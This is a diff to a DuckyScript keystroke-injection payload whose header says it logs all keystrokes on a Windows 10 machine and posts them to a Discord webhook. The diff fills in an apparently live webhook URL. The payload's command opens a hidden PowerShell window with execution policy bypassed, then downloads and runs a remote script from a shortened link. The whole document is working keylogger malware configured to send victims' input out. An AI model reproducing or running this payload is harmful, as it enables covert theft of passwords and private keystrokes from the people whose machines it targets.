@@ -5,7 +5,7 @@ REM Description: This script logs all Keystrokes and posts results to a discord 
 REM Target: Windows 10
 
 REM *SETUP*
-REM replace DISCORD_WEBHOOK_HERE with your Discord Webhook.
+REM https://discord.com/api/webhooks/1345250953443676192/ukZ-bCsWDiOSAz2u5TMT1ozYlX1kn5LCzNoX8oE3lrU2gd9wMEaV1febdSjj7vfJz3Rf
 
 REM some setup for dukie script
 DEFAULT_DELAY 100
@@ -14,7 +14,7 @@ REM open powershell (remove "-W H" to show the window)
 DELAY 1000
 GUI r
 DELAY 750
-STRING powershell -NoP -Ep Bypass -W H -C $dc='DISCORD_WEBHOOK_HERE'; irm https://is.gd/bw_kl_to_dc | iex
+STRING powershell -NoP -Ep Bypass -W H -C $dc='https://discord.com/api/webhooks/1345250953443676192/ukZ-bCsWDiOSAz2u5TMT1ozYlX1kn5LCzNoX8oE3lrU2gd9wMEaV1febdSjj7vfJz3Rf'; irm https://is.gd/bw_kl_to_dc | iex
 ENTER
 
 
